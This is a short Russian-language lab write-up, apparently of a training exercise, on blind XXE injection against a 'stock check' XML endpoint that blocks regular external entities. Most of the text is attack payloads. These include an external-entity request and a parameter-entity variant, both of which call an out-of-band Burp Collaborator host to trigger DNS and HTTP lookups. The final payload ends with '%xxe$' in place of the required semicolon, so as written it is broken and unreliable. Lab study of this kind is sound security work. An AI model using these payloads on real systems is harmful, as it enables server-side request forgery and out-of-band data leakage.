Эта лаборатория имеет функцию «проверка запаса», которая анализирует вход XML, но не отображает никаких неожиданных значений и блокирует запросы, содержащие регулярные внешние объекты.


## Дано

уязвимость в функцию «проверка запасов»
не отображает результат инъекции
блокирует запросы, содержащие регулярные внешние объекты.
## Задача

используйте внешнюю сущность, чтобы заставить XML -анализатор выпуска поиска DNS и HTTP -запрос для Burp Collaborator

# Решение

- запрос
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```

- тест на dtd
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ 
	<!ENTITY xxe SYSTEM "http://5ouc2phowsd0prsgox25a7psljraf23r.oastify.com"> 
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```
схавал

- так как знаем уже о защите на выражения делаем вот так
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ 
	<!ENTITY % xxe SYSTEM "http://5ouc2phowsd0prsgox25a7psljraf23r.oastify.com"> 
	%xxe$
]>
<stockCheck>
	<productId>1</productId>
	<storeId>1</storeId>
</stockCheck>
```